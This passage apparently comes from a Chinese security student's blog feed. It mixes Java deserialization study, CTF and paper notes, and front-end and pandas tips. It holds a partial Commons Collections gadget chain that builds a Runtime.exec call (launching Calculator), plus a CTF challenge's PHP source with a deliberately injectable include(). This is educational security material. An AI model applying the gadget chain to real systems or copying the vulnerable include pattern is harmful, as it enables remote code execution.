id="ChainedTransformer类"><a href="#ChainedTransformer类" class="headerlink" title="ChainedTransformer类"></a>ChainedTransformer类</h4><p>跟一下 <code>transfomer</code> 我们发现 <code>ChainedTransformer</code> 类中 调用了 <code>trasformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">           object = iTransformers[i].transform(object);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> object;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>循环调用transform函数，就可以执行到最终的想要调用的函数</p><p><code>iTransformers[0]</code>是<code>ConstantTransformer</code>实例，跟进<code>ConstantTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现<code>ConstantTransformer#transform</code>把构造函数定义的<code>iConstant</code>变量返回。所以只需定义<code>iTransformers[0]=new ConstantTransformer(Runtime.class)</code>即可在第二次（i=1）循环中将object赋值为<code>Runtime.class</code>，也就是我们想要的<code>input</code></p><p><code>ChainedTransformer</code>也继承自<code>Transformer, Serializable</code>，那么就可以利用<code>ChainedTransformer</code>构造一个完整的反射链如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app/&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/java-sec-1/image-20211026214223710-16352557475342.png" alt="image-20211026214223710"></p><p>第二、三、四次循环不再调用<code>ConstantTransformer#transform</code>，而是调用<code>InvokerTransformer#transform</code>，步入文章伊始提到的反射操作。值得注意的是，后三次的循环<code>object</code>值均来自此方法中return的<code>method.invoke(input, iArgs)</code></p><p>嫖一张大佬的图</p><img src="/2022/06/21/java-sec-1/rtj4yXqzG1cHQvL.jpg" alt="-w973" style="zoom:67%;"><p>之后的封装可参考大佬的poc （我就是懒</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://hpdoger.cn/2021/01/04/title:%20Common-Collentions3.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJava%E5%85%A5%E5%9D%91(%E5%8A%9D%E9%80%80)%E6%8C%87%E5%8D%97/#JDK1-7-%E5%AF%BB%E6%89%BEreadObject-%E5%A4%8D%E5%86%99%E5%88%A9%E7%94%A8%E9%93%BE">https://hpdoger.cn/2021/01/04/title:%20Common-Collentions3.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJava%E5%85%A5%E5%9D%91(%E5%8A%9D%E9%80%80)%E6%8C%87%E5%8D%97/#JDK1-7-%E5%AF%BB%E6%89%BEreadObject-%E5%A4%8D%E5%86%99%E5%88%A9%E7%94%A8%E9%93%BE</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;快一年前写的文章？自从决定走留学道路 web研究这方面进度慢了太多了吧 生活充满了艰辛和无奈啊  继续拾起来了&lt;/p&gt;</summary>
    
    
    
    <category term="java-sec" scheme="http://example.com/categories/java-sec/"/>
    
    
    <category term="java-sec" scheme="http://example.com/tags/java-sec/"/>
    
  </entry>
  
  <entry>
    <title>写数据库课设前端的一些小总结</title>
    <link href="http://example.com/2022/06/17/vue-cors/"/>
    <id>http://example.com/2022/06/17/vue-cors/</id>
    <published>2022-06-16T16:56:42.000Z</published>
    <updated>2022-06-21T13:12:34.499Z</updated>
    
    <content type="html"><![CDATA[<p>这几天肝了一个数据库的前端页面虽然很low 但是还是学会了很多前端的知识 记一些小技巧 以后说不定还会遇到</p><span id="more"></span><h2 id="vue-cli结构"><a href="#vue-cli结构" class="headerlink" title="vue-cli结构"></a>vue-cli结构</h2><img src="/2022/06/17/vue-cors/image-20220621204020355.png" alt="image-20220621204020355" style="zoom: 33%;"><h2 id="本地开发如何解决跨域问题"><a href="#本地开发如何解决跨域问题" class="headerlink" title="本地开发如何解决跨域问题"></a>本地开发如何解决跨域问题</h2><p>用了这玩意http-proxy-middleware</p><p>直接在本地代理一下 就可以直接绕过跨域 好评</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javascript</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; createProxyMiddleware &#125; = <span class="built_in">require</span>(<span class="string">&#x27;http-proxy-middleware&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="title function_">createProxyMiddleware</span>(&#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&#x27;http://124.221.237.241:8081/&#x27;</span>,</span><br><span class="line">        <span class="comment">// target: &#x27;http://127.0.0.1:5000&#x27;,</span></span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br><span class="line"><span class="comment">// proxy and change the base path from &quot;/api&quot; to &quot;/secret&quot;</span></span><br><span class="line"><span class="comment">// http://127.0.0.1:3000/api/foo/bar -&gt; http://www.example.org/secret/foo/bar</span></span><br></pre></td></tr></table></figure><h2 id="如何快速开发"><a href="#如何快速开发" class="headerlink" title="如何快速开发"></a>如何快速开发</h2><p>实验了一下 直接 vue+ element-ui 摁往上怼</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>很多东西不写你就永远不理解</p><p>写代码 yyds！！！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这几天肝了一个数据库的前端页面虽然很low 但是还是学会了很多前端的知识 记一些小技巧 以后说不定还会遇到&lt;/p&gt;</summary>
    
    
    
    <category term="front-end" scheme="http://example.com/categories/front-end/"/>
    
    
    <category term="front-end" scheme="http://example.com/tags/front-end/"/>
    
    <category term="vuejs" scheme="http://example.com/tags/vuejs/"/>
    
  </entry>
  
  <entry>
    <title>annoy-pandas</title>
    <link href="http://example.com/2022/06/09/annoy-pandas/"/>
    <id>http://example.com/2022/06/09/annoy-pandas/</id>
    <published>2022-06-09T11:10:49.000Z</published>
    <updated>2022-06-09T12:13:01.262Z</updated>
    
    <content type="html"><![CDATA[<p>一个令我头疼的问题</p><span id="more"></span><h2 id="bug-describe"><a href="#bug-describe" class="headerlink" title="bug describe"></a>bug describe</h2><p>如下 我想给 <code>index</code> 列加一个标签？ 如何加</p><p><img src="/2022/06/09/annoy-pandas/image-20220609192003672-16547736228841-165477673244011.png" alt="image-20220609192003672"></p><p>如下图所示</p><p><img src="/2022/06/09/annoy-pandas/image-20220609200610436-16547767304409.png" alt="image-20220609200610436"></p><p>但大家可以看到 A 已经 和 B C 区别开来了</p><p>其实这个时候 列名可以说是和之前的 B C 不在一个维度上了</p><p><img src="/2022/06/09/annoy-pandas/image-20220609200749174-16547767290437.png" alt="image-20220609200749174"></p><p>我们可以照样改列的名</p><p><img src="/2022/06/09/annoy-pandas/image-20220609200915593-16547767276975.png" alt="image-20220609200915593"></p><p>从下面这张图就很好理解了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df1.index.names = [<span class="string">&#x27;index&#x27;</span>]</span><br><span class="line">df1.columns.names = [<span class="string">&#x27;column&#x27;</span>]</span><br></pre></td></tr></table></figure><p><img src="/2022/06/09/annoy-pandas/image-20220609201146804-16547767260473.png" alt="image-20220609201146804"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一个令我头疼的问题&lt;/p&gt;</summary>
    
    
    
    <category term="pandas" scheme="http://example.com/categories/pandas/"/>
    
    
    <category term="bug" scheme="http://example.com/tags/bug/"/>
    
  </entry>
  
  <entry>
    <title>Understanding Convolutions on Graphs</title>
    <link href="http://example.com/2022/06/09/Understanding-Convolutions-on-Graphs/"/>
    <id>http://example.com/2022/06/09/Understanding-Convolutions-on-Graphs/</id>
    <published>2022-06-09T05:18:31.000Z</published>
    <updated>2022-06-09T09:21:43.997Z</updated>
    
    <content type="html"><![CDATA[<p>学习一下GCN</p><p>具体可参考<a href="https://distill.pub/2021/understanding-gnns/">https://distill.pub/2021/understanding-gnns/</a></p><span id="more"></span><h2 id="由一个问题引发的血案"><a href="#由一个问题引发的血案" class="headerlink" title="由一个问题引发的血案"></a>由一个问题引发的血案</h2><p>先来看一个最最最最重要的问题  – <strong>如何将图结构转换为神经网络</strong>？</p><p>简单说一个我在实际中遇到的问题</p><p>车流量 12个node   如何转化为 seq2seq 的数据形式？</p><p>来看两张直观的图片</p><img src="/2022/06/09/Understanding-Convolutions-on-Graphs/MyBlog\b1ue0cean.github.io\source\_posts\Understanding-Convolutions-on-Graphs\image-20220609133025298.png" alt="image-20220609133025298" style="zoom: 67%;"><img src="/2022/06/09/Understanding-Convolutions-on-Graphs/MyBlog\b1ue0cean.github.io\source\_posts\Understanding-Convolutions-on-Graphs\image-20220609133747761.png" alt="image-20220609133747761" style="zoom: 67%;"><p>最简单去想到的就是取 12*12 的一个数据格式 然后里面可以存参数来表示不同node之间的联系</p><p>但是一个会够吗？实际上实验中使用了 12 x 12 x 2  的数据格式   也就是说 不同节点之间的关系可以用多维数据来表示</p><p>（我怎么这么死脑筋 ~~</p><h2 id="再来一个问题"><a href="#再来一个问题" class="headerlink" title="再来一个问题"></a>再来一个问题</h2><p>图结构如何来卷积？</p><p>​                                                                                                                      正常的卷积</p><p><img src="/2022/06/09/Understanding-Convolutions-on-Graphs/MyBlog\b1ue0cean.github.io\source_posts\Understanding-Convolutions-on-Graphs\image-20220609171310312.png" alt="image-20220609171310312"></p><p>图结构的卷积</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习一下GCN&lt;/p&gt;
&lt;p&gt;具体可参考&lt;a href=&quot;https://distill.pub/2021/understanding-gnns/&quot;&gt;https://distill.pub/2021/understanding-gnns/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="GNN" scheme="http://example.com/categories/GNN/"/>
    
    
    <category term="GCN" scheme="http://example.com/tags/GCN/"/>
    
  </entry>
  
  <entry>
    <title>AppCracker -- Widespread Vulnerabilities in User paper note and Session Authentication in Mobile Apps</title>
    <link href="http://example.com/2022/06/06/app-crack/"/>
    <id>http://example.com/2022/06/06/app-crack/</id>
    <published>2022-06-06T11:37:34.000Z</published>
    <updated>2022-06-09T05:20:16.058Z</updated>
    
    <content type="html"><![CDATA[<p>面试老师让我读的</p><span id="more"></span><h2 id="INTRODUCTION"><a href="#INTRODUCTION" class="headerlink" title="INTRODUCTION"></a>INTRODUCTION</h2><p>文章发明了一种叫AppCracker的工具来检测比较流行的app的安全漏洞</p><p>这些漏洞发生的原因：</p><blockquote><p>use home-grown protocols and fall victim to various cryptographic pitfalls, such as insecure selection of symmetric and public keys, insecure distribution of keys, insecure modes of operation, insecure message authentication code, or security by obscurity. Besides user authentication, session authentication is also vulnerable in some apps, as they fail to protect their session IDs in the HTTP request body or cookie.</p></blockquote><h2 id="METHODOLOGY"><a href="#METHODOLOGY" class="headerlink" title="METHODOLOGY"></a>METHODOLOGY</h2><p>然后这个 AppCracker 有俩模式</p><ul><li>Passive mode (as an eavesdropper): AppCracker takes as input packets from the app (e.g., the output of tshark, a command line tool for dumping network traffic) and extracts useful data from the packets. </li><li>Active mode (as a MITM attacker): Figure 1 shows AppCracker in the active attack mode.</li></ul><img src="/2022/06/06/app-crack/image-20220606201417507-16545178049151.png" alt="image-20220606201417507" style="zoom: 67%;"><p>Fig. 1: AppCracker running in the active attack mode. AppCracker interacts with an unmodified Apache web server running on the same WiFi AP</p><ol><li>The app sends an HTTP(S) request to the WIFI AP. The iptables running on the AP redirects the request to the web server running on the same AP. </li><li> The web server forwards the request to AppCracker. </li><li>AppCracker modifies the request and sends it back to the web server. </li><li>The web server forwards the request to the app server. </li><li> The web server receives the response from the app server.</li><li>The web server forwards the response to AppCracker. </li><li>AppCracker modifies the response and sends it back to the web server.</li><li>The web server forwards the response back to the app.</li></ol><p>然后 用python去模拟请求</p><img src="/2022/06/06/app-crack/image-20220606202924335.png" alt="image-20220606202924335" style="zoom:67%;"><p>看到这里作者都还是在扯皮 一句有用的话也没有</p><h3 id="PASSIVE-ATTACK"><a href="#PASSIVE-ATTACK" class="headerlink" title="PASSIVE ATTACK"></a>PASSIVE ATTACK</h3><p>举出了一些可能存在安全隐患的例子</p><p><strong>Plaintext or Encoded Data</strong> – 有些app没有对流量进行加密</p><p><strong>Encryption</strong> – 有些的加密不规范</p><p><strong>Message Integrity</strong> – 有些app 没用SSL  用他们自己写的认证</p><p><strong>Sessions</strong> </p><h3 id="ACTIVE-ATTACKS"><a href="#ACTIVE-ATTACKS" class="headerlink" title="ACTIVE ATTACKS"></a>ACTIVE ATTACKS</h3><p>中间人攻击 + 认证上的漏洞</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>科研上和我平时接触到的安全区别还是比较大的。感觉做科研，更像是研究出一套安全开发方法论。比如这篇论文中的一些数据传输没有加密，在渗透测试中其实可利用的范围还是有限的，现在的扫描器扫到了也就只是提醒一下。而科研中对于这种问题的态度似乎是极为严肃的，因为可能会考虑到更加广泛的攻击方式和攻击面。</p><p>无论是渗透测试还是白盒审计更多考虑到的是一些真实存在的漏洞，比如我要挖一个实际可利用的漏洞。而科研上似乎要站在更高的层次，针对一些可能会出现存在的问题进行一种通用的考虑。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;面试老师让我读的&lt;/p&gt;</summary>
    
    
    
    <category term="security" scheme="http://example.com/categories/security/"/>
    
    
    <category term="paper note" scheme="http://example.com/tags/paper-note/"/>
    
  </entry>
  
  <entry>
    <title>Security Fest 2022 wp</title>
    <link href="http://example.com/2022/06/02/Security-Fest-2022/"/>
    <id>http://example.com/2022/06/02/Security-Fest-2022/</id>
    <published>2022-06-02T13:09:51.000Z</published>
    <updated>2022-06-05T09:52:07.953Z</updated>
    
    <content type="html"><![CDATA[<p>玩玩</p><span id="more"></span><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Dumperignon"><a href="#Dumperignon" class="headerlink" title="Dumperignon"></a><strong>Dumperignon</strong></h3><blockquote><p><a href="http://dumperignon-01.hackaplaneten.se/?source">dumperignon-01.hackaplaneten.se/?source</a><br>What would you rather pop, bottles or shells?</p></blockquote><p>真的是好久好久好久好久没做php了</p><p>source</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_fopen&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;/var/www&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">nohack</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/(\.\.+|^\/|^(file|http|https|ftp):)/i&quot;</span>, <span class="string">&quot;XXX&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">nohack</span>(<span class="variable">$val</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="variable">$_GET</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">nohack</span>(<span class="variable">$val</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="variable">$_REQUEST</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">nohack</span>(<span class="variable">$val</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">set_include_path</span>(<span class="string">&quot;/var/www/messages&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Message contents: &lt;br&gt;\n&lt;pre&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">1000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;too big file&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">1337</span>).<span class="string">&quot;.msg&quot;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;/var/www/messages/&quot;</span>.<span class="variable">$filename</span>, <span class="string">&#x27;wb&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;&lt;?php var_dump(&quot;</span>.<span class="title function_ invoke__">var_export</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>], <span class="literal">true</span>).<span class="string">&quot;)?&gt;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /?file=&#x27;</span>.<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html lang=<span class="string">&quot;en-US&quot;</span>&gt;</span><br><span class="line">   &lt;head id=<span class="string">&quot;head&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Dumperignon&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        <span class="comment">/* nothing chall related here, I hope */</span></span><br><span class="line"></span><br><span class="line">body, html &#123;</span><br><span class="line">    height: <span class="number">100</span>%;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .bg::<span class="variable constant_">before</span> &#123;</span><br><span class="line">    content: <span class="string">&quot;&quot;</span>;</span><br><span class="line">    top: <span class="number">0</span>;</span><br><span class="line">    left: <span class="number">0</span>;</span><br><span class="line">    width: <span class="number">100</span>%;</span><br><span class="line">    height: <span class="number">100</span>%;</span><br><span class="line">    position: absolute;</span><br><span class="line">    background-position: center;</span><br><span class="line">    background-repeat: no-repeat;</span><br><span class="line">    background-size: cover;</span><br><span class="line">    filter: <span class="title function_ invoke__">blur</span>(<span class="number">3</span>px);</span><br><span class="line">    background-image: <span class="title function_ invoke__">url</span>(https:<span class="comment">//wallpaperaccess.com/full/3016743.jpg);</span></span><br><span class="line">  &#125;</span><br><span class="line">  textarea &#123;</span><br><span class="line">  width: <span class="number">100</span>%;</span><br><span class="line">  height: <span class="number">150</span>px;</span><br><span class="line">  padding: <span class="number">12</span>px <span class="number">20</span>px;</span><br><span class="line">  box-sizing: border-box;</span><br><span class="line">  border: <span class="number">2</span>px solid <span class="comment">#ccc;</span></span><br><span class="line">  border-radius: <span class="number">4</span>px;</span><br><span class="line">  background-color: <span class="comment">#f8f8f8;</span></span><br><span class="line">  font-size: <span class="number">16</span>px;</span><br><span class="line">  overflow:hidden;</span><br><span class="line">&#125;</span><br><span class="line">input &#123;</span><br><span class="line">    width: <span class="number">100</span>%;</span><br><span class="line">  background-color: <span class="comment">#784caf; /* Green */</span></span><br><span class="line">  border: <span class="number">1</span>px solid black;</span><br><span class="line">  color: white;</span><br><span class="line">  padding: <span class="number">15</span>px <span class="number">32</span>px;</span><br><span class="line">  text-align: center;</span><br><span class="line">  text-decoration: none;</span><br><span class="line">  display: inline-block;</span><br><span class="line">  font-size: <span class="number">16</span>px;</span><br><span class="line">&#125;</span><br><span class="line">  .bg-inside &#123;</span><br><span class="line">    text-align: center;</span><br><span class="line">    font: bold <span class="number">42</span>px sans-serif;</span><br><span class="line">    width: <span class="number">600</span>px;</span><br><span class="line">    height: <span class="number">300</span>px;</span><br><span class="line">    </span><br><span class="line">    position: absolute;</span><br><span class="line">    top:<span class="number">0</span>;</span><br><span class="line">    bottom: <span class="number">0</span>;</span><br><span class="line">    left: <span class="number">0</span>;</span><br><span class="line">    right: <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    margin: auto;</span><br><span class="line">  &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">bg</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">bg</span>-<span class="title">inside</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;/&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">textarea</span> <span class="title">name</span>=&quot;<span class="title">file</span>&quot; <span class="title">required</span> <span class="title">placeholder</span>=&quot;<span class="title">Enter</span> <span class="title">message</span> <span class="title">contents</span>...&quot;&gt;&lt;/<span class="title">textarea</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Save</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">form</span>&gt;</span></span><br><span 